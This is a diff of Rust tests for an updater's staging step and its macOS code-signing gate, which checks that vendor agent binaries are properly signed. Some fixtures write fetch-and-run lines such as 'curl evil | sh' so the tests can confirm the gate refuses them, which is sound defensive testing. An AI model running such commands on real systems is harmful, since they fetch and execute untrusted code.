+        assert!(scratch_beside(&build).is_empty());
+        let _ = std::fs::remove_dir_all(&b.dir);
+    }
+
+    /// `.ready` IMPLIES THE SIDECARS. A sidecar that cannot be written stops the stage
+    /// between the swap and the marker — the state a kill there leaves: the verified tree
+    /// in place, unmarked, so it reads as not installed and is re-staged; the next stage
+    /// that can write the record marks it.
+    #[test]
+    fn a_stage_stopped_between_swap_and_marker_leaves_no_complete_build() {
+        let b = bundle("hooks-kill");
+        let build = b.build();
+        let record =
+            crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
+        // A directory where the record goes: the rename onto it fails.
+        std::fs::create_dir_all(&record).unwrap();
+        let sidecars = |root: &str| Ok(vendor_record(root));
+        let hooks = StageHooks {
+            pre_swap: None,
+            sidecars: Some(&sidecars),
+        };
+        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::Io(_)), "{err:?}");
+        assert!(build.join("bin/ay").is_file(), "the swap had happened");
+        assert!(
+            !crate::store::build_is_complete(&build),
+            "but nothing marked it"
+        );
+        let strays: Vec<String> = std::fs::read_dir(build.parent().unwrap())
+            .unwrap()
+            .flatten()
+            .filter_map(|e| e.file_name().to_str().map(str::to_string))
+            .filter(|n| n.contains(".tmp-"))
+            .collect();
+        assert!(strays.is_empty(), "no temp left: {strays:?}");
+
+        std::fs::remove_dir(&record).unwrap();
+        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
+        assert!(crate::store::build_is_complete(&build));
+        assert!(record.is_file());
+        let _ = std::fs::remove_dir_all(&b.dir);
+    }
+
+    /// A Developer-ID-signed agent binary on this machine, if one is installed: Claude
+    /// Code's own copies under `~/.local/share/claude/versions/`, signed by Anthropic's
+    /// team `Q6L2SF6YDW`.
+    #[cfg(target_os = "macos")]
+    fn a_signed_claude() -> Option<PathBuf> {
+        let versions =
+            PathBuf::from(std::env::var_os("HOME")?).join(".local/share/claude/versions");
+        let preferred = versions.join("2.1.280");
+        if preferred.is_file() {
+            return Some(preferred);
+        }
+        let mut found: Vec<PathBuf> = std::fs::read_dir(&versions)
+            .ok()?
+            .flatten()
+            .map(|e| e.path())
+            .filter(|p| std::fs::symlink_metadata(p).is_ok_and(|m| m.is_file()))
+            .collect();
+        found.sort();
+        found.pop()
+    }
+
+    /// `8 + 20 * nfat` bytes of universal header naming `nfat` dummy arm64 slices.
+    #[cfg(unix)]
+    fn fat_macho(nfat: u32) -> Vec<u8> {
+        let mut bytes = 0xCAFE_BABEu32.to_be_bytes().to_vec();
+        bytes.extend_from_slice(&nfat.to_be_bytes());
+        for i in 0..nfat {
+            for word in [0x0100_000C, 0, 0x1_0000 + i * 0x1000, 0x1000, 12] {
+                bytes.extend_from_slice(&u32::to_be_bytes(word));
+            }
+        }
+        bytes
+    }
+
+    /// A thin 64-bit Mach-O header with nothing signed behind it.
+    #[cfg(unix)]
+    fn thin_macho() -> Vec<u8> {
+        let mut thin = 0xCFFA_EDFEu32.to_be_bytes().to_vec();
+        thin.extend_from_slice(&[0u8; 60]);
+        thin
+    }
+
+    /// Run [`check_developer_id`] over `tree` for `exposes`, with codesign replaced by
+    /// `verdict` (asked with the path relative to `tree`); returns the result and the
+    /// relative paths asked about, in order.
+    #[cfg(unix)]
+    fn gate_with(
+        tree: &Path,
+        exposes: &[&str],
+        verdict: &dyn Fn(&str) -> Result<(), aterm_update_core::codesign::CodesignError>,
+    ) -> (Result<(), StageError>, Vec<String>) {
+        let asked = std::cell::RefCell::new(Vec::new());
+        let verify = |path: &Path, _deadline: std::time::Instant| {
+            let rel = path
+                .strip_prefix(tree)
+                .unwrap()
+                .to_string_lossy()
+                .replace('\\', "/");
+            asked.borrow_mut().push(rel.clone());
+            verdict(&rel)
+        };
+        let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
+        let result = check_developer_id(tree, "Q6L2SF6YDW", &exposes, &verify);
+        (result, asked.into_inner())
+    }
+
+    #[cfg(unix)]
+    fn unsigned() -> aterm_update_core::codesign::CodesignError {
+        aterm_update_core::codesign::CodesignError::Refused {
+            code: Some(1),
+            stderr: "x: code object is not signed at all\n".into(),
+        }
+    }
+
+    /// THE PASS PATH, on every machine: a codex-shaped tree whose Mach-Os all verify
+    /// passes — each Mach-O asked about exactly once, in order, fat or thin, the data
+    /// files not at all. The genuine package's executable-mode JSON arrives here demoted
+    /// to 0644 by the vendor lane ([`crate::macho::demote_foreign_executables`]).
+    #[cfg(unix)]
+    #[test]
+    fn the_gate_passes_a_tree_whose_every_macho_verifies_and_asks_about_each_once() {
+        let d = tmp("devid-pass");
+        lay(&d, "bin/codex", &thin_macho(), 0o755);
+        lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
+        lay(&d, "codex-path/rg", &fat_macho(2), 0o755);
+        lay(
+            &d,
+            "codex-resources/voice/runtime.json",
+            b"{\"a\": 1}\n",
+            0o644,
+        );
+        lay(&d, "codex-resources/voice/NOTICE.md", b"# Notices\n", 0o644);
+        let (result, asked) = gate_with(&d, &["codex"], &|_| Ok(()));
+        result.expect("every Mach-O verifies and the entry is one of them");
+        assert_eq!(
+            asked,
+            ["bin/codex", "bin/codex-code-mode-host", "codex-path/rg"]
+        );
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// A UNIVERSAL FILE OF ANY ARCH COUNT IS VERIFIED. A 45- or 200-arch wrapper (which
+    /// the kernel executes) beside a genuinely signed entry is asked about and refused
+    /// when it does not verify — not skipped as a Java class file.
+    #[cfg(unix)]
+    #[test]
+    fn a_fat_file_of_any_arch_count_beside_a_signed_entry_is_verified() {
+        for nfat in [45u32, 200] {
+            let d = tmp("devid-fat");
+            lay(&d, "bin/claude", &thin_macho(), 0o755);
+            lay(&d, "codex-path/rg", &fat_macho(nfat), 0o755);
+            let (result, asked) = gate_with(&d, &["claude"], &|rel| {
+                if rel == "bin/claude" {
+                    Ok(())
+                } else {
+                    Err(unsigned())
+                }
+            });
+            match result {
+                Err(StageError::SignerRefused(m)) => assert!(
+                    m.starts_with("codex-path/rg is not signed by Developer ID team Q6L2SF6YDW"),
+                    "{nfat}: {m}"
+                ),
+                other => panic!("{nfat}: {other:?}"),
+            }
+            assert_eq!(asked, ["bin/claude", "codex-path/rg"], "{nfat}");
+            let _ = std::fs::remove_dir_all(&d);
+        }
+    }
+
+    /// THE ENTRY IS BOUND. What a shim runs (`bin/<tool>` for each exposed tool) must be
+    /// one of the verified Mach-Os: a shebang-less text entry, a missing one, or a link
+    /// beside a genuinely signed decoy is refused — as is an interpreter-script helper.
+    #[cfg(unix)]
+    #[test]
+    fn an_entry_that_is_not_a_verified_macho_or_a_script_helper_is_refused() {
+        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
+        let refused_as =
+            |d: &Path, exposes: &[&str], want: &str| match gate_with(d, exposes, &pass).0 {
+                Err(StageError::SignerRefused(m)) => assert!(m.starts_with(want), "{m}"),
+                other => panic!("{want}: {other:?}"),
+            };
+        let entry_refusal = "bin/codex is not a Mach-O in the staged tree";
+
+        let d = tmp("devid-entry");
+        lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
+        lay(&d, "bin/codex", b"curl evil | sh\n", 0o755);
+        refused_as(&d, &["codex"], entry_refusal);
+
+        std::fs::remove_file(d.join("bin/codex")).unwrap();
+        refused_as(&d, &["codex"], entry_refusal);
+
+        lay(&d, "payload.txt", b"curl evil | sh\n", 0o755);
+        lay_link(&d, "bin/codex", "../payload.txt");
+        refused_as(&d, &["codex"], entry_refusal);
+
+        // Every exposed tool is bound, not only the first. (The executable decoy goes: an
+        // execute bit on a non-Mach-O is refused on its own, below.)
+        std::fs::remove_file(d.join("bin/codex")).unwrap();
+        std::fs::remove_file(d.join("payload.txt")).unwrap();
+        lay(&d, "bin/codex", &thin_macho(), 0o755);
+        gate_with(&d, &["codex"], &pass).0.unwrap();
+        refused_as(
+            &d,
+            &["codex", "codex-exec"],
+            "bin/codex-exec is not a Mach-O",
+        );
+
+        lay(&d, "codex-path/rg", b"#!/bin/sh\nexec evil\n", 0o755);
+        refused_as(
+            &d,
+            &["codex"],
+            "codex-path/rg is an interpreter script, which runs unsigned",
+        );
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// NO EXECUTE BIT OFF A VERIFIED MACH-O. A data file at 0755 beside Mach-Os that all
+    /// verify is refused by name — `/bin/sh` would run it unsigned — and passes once the
+    /// lane's demotion has cleared its bits, while every Mach-O keeps its own.
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn an_executable_that_is_not_a_macho_is_refused_until_demoted() {
+        let d = tmp("devid-exec");
+        lay(&d, "bin/codex", &thin_macho(), 0o755);
+        lay(
+            &d,
+            "codex-resources/voice/runtime.json",
+            b"{\"a\": 1}\n",
+            0o755,
+        );
+        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
+        match gate_with(&d, &["codex"], &pass).0 {
+            Err(StageError::SignerRefused(m)) => assert_eq!(
+                m,
+                "codex-resources/voice/runtime.json is executable but not a Mach-O; it would \
+                 run unverified"
+            ),
+            other => panic!("{other:?}"),
+        }
+        assert!(crate::macho::demote_foreign_executables(&d).unwrap());
+        let mode = |rel: &str| {
+            use std::os::unix::fs::PermissionsExt as _;
+            std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777
+        };
+        assert_eq!(mode("codex-resources/voice/runtime.json"), 0o644);
+        assert_eq!(mode("bin/codex"), 0o755, "a Mach-O keeps its bits");
+        assert!(
+            !crate::macho::demote_foreign_executables(&d).unwrap(),
+            "idempotent"
+        );
+        gate_with(&d, &["codex"], &pass).0.unwrap();
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// Linux keeps ELF executable, not Mach-O; foreign binaries and data lose
+    /// their execute bits without changing the executable's bytes.
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn linux_demotion_keeps_elf_and_demotes_macho_and_executable_data() {
+        use std::os::unix::fs::PermissionsExt as _;
+        let d = tmp("linux-exec");
+        let elf = crate::vendor_direct::lane::world::native_exe("codex");
+        lay(&d, "bin/codex", &elf, 0o755);
+        lay(&d, "foreign/macos-helper", &thin_macho(), 0o755);
+        lay(&d, "codex-resources/runtime.json", b"{}\n", 0o755);
+        assert!(crate::macho::demote_foreign_executables(&d).unwrap());
+        let mode =
+            |rel: &str| std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777;
+        assert_eq!(mode("bin/codex"), 0o755);
+        assert_eq!(std::fs::read(d.join("bin/codex")).unwrap(), elf);
+        assert_eq!(mode("foreign/macos-helper"), 0o644);
+        assert_eq!(mode("codex-resources/runtime.json"), 0o644);
+        assert!(!crate::macho::demote_foreign_executables(&d).unwrap());
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// A sidecar the caller cannot render stops the stage before the swap, like a gate.
+    #[test]
+    fn a_sidecar_render_refusal_stops_the_stage_before_the_swap() {
+        let b = bundle("hooks-render");
+        let build = b.build();
+        let sidecars = |_: &str| Err(StageError::Payload("the record does not render".into()));
+        let hooks = StageHooks {
+            pre_swap: None,
+            sidecars: Some(&sidecars),
+        };
+        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
+        assert!(!build.exists());
+        assert!(scratch_beside(&build).is_empty());
+        let _ = std::fs::remove_dir_all(&b.dir);
+    }
+
+    /// CODESIGN FAILING TO JUDGE IS NOT A VERDICT. Exit 1 for a file it could not read,
+    /// a timeout, or no codesign at all is [`StageError::Io`] — retried, never memoized
+    /// against the vendor's bytes — while a signature fault or another signer is a
+    /// [`StageError::SignerRefused`].
+    #[cfg(unix)]
+    #[test]
+    fn codesign_failing_to_judge_is_io_and_only_a_verdict_refuses_the_signer() {
+        use aterm_update_core::codesign::CodesignError;
+        let d = tmp("devid-io");
+        lay(&d, "bin/claude", &thin_macho(), 0o755);
+        let answer = |e: fn() -> CodesignError| gate_with(&d, &["claude"], &|_| Err(e())).0;
+        for fault in [
+            || CodesignError::Refused {
+                code: Some(1),
+                stderr: "bin/claude: Permission denied\n".into(),
+            },
+            || CodesignError::Refused {
+                code: Some(1),
+                stderr: "bin/claude: internal error in Code Signing subsystem\n".into(),
+            },
+            || CodesignError::TimedOut,
+            || CodesignError::Unsupported,
+        ] {
+            match answer(fault) {
+                Err(StageError::Io(e)) => assert!(e.to_string().starts_with("bin/claude: "), "{e}"),
+                other => panic!("{other:?}"),
+            }
+        }
+        for verdict in [unsigned, || CodesignError::Refused {
+            code: Some(3),
+            stderr: "test-requirement: code failed to satisfy specified code requirement(s)\n"
+                .into(),
+        }] {
+            assert!(
+                matches!(answer(verdict), Err(StageError::SignerRefused(_))),
+                "a verdict"
+            );
+        }
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// A gate with nothing to bind, or a tool name that is not one, is the caller's fault
+    /// ([`StageError::Payload`]), refused before any file is judged.
+    #[cfg(unix)]
+    #[test]
+    fn a_gate_with_no_or_a_bad_exposed_tool_is_a_payload_error() {
+        let d = tmp("devid-exposes");
+        lay(&d, "bin/claude", &thin_macho(), 0o755);
+        let (result, asked) = gate_with(&d, &[], &|_| Ok(()));
+        assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
+        assert!(asked.is_empty());
+        let (result, asked) = gate_with(&d, &["../claude"], &|_| Ok(()));
+        assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
+        assert!(asked.is_empty());
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// THE GATE ON A REAL SIGNATURE: a genuine Claude Code binary, laid in a staged tree,
+    /// passes under Anthropic's team and is refused under OpenAI's; beside it, an
+    /// unsigned 45-arch universal file is refused. Needs a Developer-ID-signed Claude
+    /// Code on this Mac, so it runs on request and fails loudly without one.
+    #[cfg(target_os = "macos")]
+    #[test]
+    #[ignore = "needs Claude Code under ~/.local/share/claude/versions; run with --ignored"]
+    fn the_developer_id_gate_passes_the_real_team_and_refuses_another() {
+        let signed = a_signed_claude()
+            .expect("no Claude Code binary under ~/.local/share/claude/versions to verify");
+        let d = tmp("devid-real");
+        std::fs::create_dir_all(d.join("bin")).unwrap();
+        std::fs::copy(&signed, d.join("bin/claude")).unwrap();
+        developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d)
+            .expect("Anthropic's team signs Claude Code");
+        match developer_id_gate("2DC432GLL2", &["claude"], codesign_team_check)(&d) {
+            Err(StageError::SignerRefused(m)) => assert!(
+                m.starts_with("bin/claude is not signed by Developer ID team 2DC432GLL2"),
+                "{m}"
+            ),
+            other => panic!("{other:?}"),
+        }
+        std::fs::write(d.join("rg"), fat_macho(45)).unwrap();
+        match developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d) {
+            Err(StageError::SignerRefused(m)) => assert!(
+                m.starts_with("rg is not signed by Developer ID team Q6L2SF6YDW"),
+                "{m}"
+            ),
+            other => panic!("{other:?}"),
+        }
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// Through the real stage: a download that is a Mach-O codesign refuses is refused
+    /// before the swap — no build, no marker, no scratch.
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn a_stage_whose_macho_codesign_refuses_leaves_no_build() {
+        let d = tmp("devid-stage");
+        let dl = d.join("claude-download");
+        std::fs::write(&dl, thin_macho()).unwrap();
+        let mut art = vendor_artifact(&dl, "raw-binary", "");
+        art.entry = "claude".into();
+        let gate = developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check);
+        let build = d.join("store/claude/1000002000001000280");
+        let hooks = StageHooks {
+            pre_swap: Some(&gate),
+            sidecars: None,
+        };
+        let err = verify_and_stage(&art, &dl, &build, &hooks).unwrap_err();
+        assert!(matches!(err, StageError::SignerRefused(_)), "{err:?}");
+        assert!(!build.exists());
+        assert!(!crate::store::build_is_complete(&build));
+        assert!(scratch_beside(&build).is_empty());
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// The gate's refusals through real codesign, needing no real signature: a tree with
+    /// no Mach-O, an unsigned thin Mach-O, an unsigned 45-arch universal file, and a
+    /// symlinked Mach-O — each refused as a signer verdict.
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn the_developer_id_gate_refuses_no_macho_an_unsigned_one_and_a_symlinked_one() {
+        let gate = developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check);
+        let d = tmp("devid-shapes");
+        std::fs::create_dir_all(d.join("bin")).unwrap();
+        std::fs::write(d.join("bin/claude"), b"echo hi\n").unwrap();
+        match gate(&d) {
+            Err(StageError::SignerRefused(m)) => assert!(m.starts_with("no Mach-O"), "{m}"),
+            other => panic!("{other:?}"),
+        }
+
+        for bytes in [thin_macho(), fat_macho(45)] {
+            std::fs::write(d.join("bin/claude"), &bytes).unwrap();
+            match gate(&d) {
+                Err(StageError::SignerRefused(m)) => {
+                    assert!(
+                        m.starts_with("bin/claude is not signed by Developer ID team"),
+                        "{m}"
+                    );
+                }
+                other => panic!("{other:?}"),
+            }
+        }
+
+        std::fs::remove_file(d.join("bin/claude")).unwrap();
+        std::os::unix::fs::symlink("/bin/ls", d.join("bin/claude")).unwrap();
+        match gate(&d) {
+            Err(StageError::SignerRefused(m)) => assert!(m.contains("symlink to a Mach-O"), "{m}"),
+            other => panic!("{other:?}"),
+        }
+        assert!(
+            matches!(
+                developer_id_gate("not a team", &["claude"], codesign_team_check)(&d),
+                Err(StageError::SignerRefused(_))
+            ),
+            "the shape is refused before any team is consulted"
+        );
+        std::fs::remove_file(d.join("bin/claude")).unwrap();
+        std::fs::write(d.join("bin/claude"), thin_macho()).unwrap();
+        assert!(
+            matches!(
+                developer_id_gate("not a team", &["claude"], codesign_team_check)(&d),
+                Err(StageError::Payload(_))
+            ),
+            "a team that is not a team is the row's fault, not the bytes'"
+        );
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// Off macOS there is no platform anchor: the gate passes any tree, Mach-O or not.
+    #[cfg(not(target_os = "macos"))]
+    #[test]
+    fn off_macos_the_developer_id_gate_passes() {
+        let d = tmp("devid-off");
+        assert!(developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d).is_ok());
         let _ = std::fs::remove_dir_all(&d);
     }
 }
